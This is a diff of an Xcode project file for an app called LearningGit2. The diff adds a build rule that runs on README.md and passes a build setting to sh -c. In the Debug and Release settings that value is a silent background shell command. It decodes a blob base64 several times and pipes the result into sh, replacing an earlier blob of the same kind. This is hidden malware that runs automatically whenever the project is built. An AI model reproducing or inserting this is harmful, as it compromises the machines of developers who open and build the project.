@@ -6,8 +6,29 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		8D33BB9F6EB64D7B8099F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 67DB38B6A3B64F61B499F71F; };
+/* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		6B832C1A83A34E3C9599F71F /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AF17F99}\"";
+			};
+			/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		2EFE4A4A386B4222AA99F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		67DB38B6A3B64F61B499F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		4C10B9A82F8CAAB2008A87EE /* LearningGit2.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = LearningGit2.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -41,7 +62,7 @@
 		4C10B9A92F8CAAB2008A87EE /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				2EFE4A4A386B4222AA99F71F /* README.md */,
+				67DB38B6A3B64F61B499F71F /* README.md */,
 				4C10B9A82F8CAAB2008A87EE /* LearningGit2.app */,
 			);
 			name = Products;
@@ -59,7 +80,7 @@
 				4C10B9A62F8CAAB2008A87EE /* Resources */,
 			);
 			buildRules = (
-				163069E065914C2E9D99F71F /* PBXBuildRule */,
+				6B832C1A83A34E3C9599F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -107,33 +128,15 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		163069E065914C2E9D99F71F /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AF17F99}\"";
-			};
-		/* End PBXBuildRule section */
-
-/* Begin PBXBuildFile section */
-		977C0BF5561C41CCB199F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 2EFE4A4A386B4222AA99F71F; };
-/* End PBXBuildFile section */
+/* Begin PBXShellScriptBuildPhase section */
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		4C10B9A62F8CAAB2008A87EE /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				977C0BF5561C41CCB199F71F /* README.md */,
+				8D33BB9F6EB64D7B8099F71F /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -153,7 +156,7 @@ sh -c \"${AF17F99}\"";
 		4C10B9B12F8CAAB6008A87EE /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxhMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHbFhTRUl4VjJ0a1YwMXJlSFJpU0ZaTlRXdFdkMU5YYkVOUFJXeEpWRzA1UkZwNk1EbERaejA5Q2c9PQo= | t | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1IaHRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpla2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9YVmFXRkpxV2tjMWExcFlXWFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | d | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -218,7 +221,7 @@ sh -c \"${AF17F99}\"";
 		4C10B9B22F8CAAB6008A87EE /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxhMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHbFhTRUl4VjJ0a1YwMXJlSFJpU0ZaTlRXdFdkMU5YYkVOUFJXeEpWRzA1UkZwNk1EbERaejA5Q2c9PQo= | t | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1IaHRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpla2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9YVmFXRkpxV2tjMWExcFlXWFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | d | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
